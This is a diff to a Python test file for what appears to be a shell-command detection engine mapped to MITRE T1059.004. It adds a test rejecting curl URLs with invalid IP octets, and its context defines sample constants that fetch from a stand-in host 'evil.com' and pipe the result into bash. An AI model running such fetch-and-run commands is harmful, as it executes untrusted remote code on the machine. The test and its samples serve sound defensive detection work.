@@ -13,6 +13,18 @@ def test_correlation_match_metadata_sourced_from_yaml():
     assert m.mitre_technique == "T1059.004"
 
 
+@pytest.mark.parametrize("bad", [
+    "curl 999.999.999.999/x",
+    "curl 300.1.2.3/rev.sh",
+    "curl 256.256.256.256/x",
+])
+def test_bare_ip_url_rejects_invalid_octets(bad):
+    """Octets >255 are not valid IPs and must not be treated as download URLs."""
+    matched, url = _is_event_a("curl", bad)
+    assert matched is False
+    assert url == ""
+
+
 CMD_URL_SHELL = "http://evil.com/s.sh | bash"
 CMD_URL_ONLY = "http://evil.com/payload"
 CMD_SHELL_ONLY = "| bash"
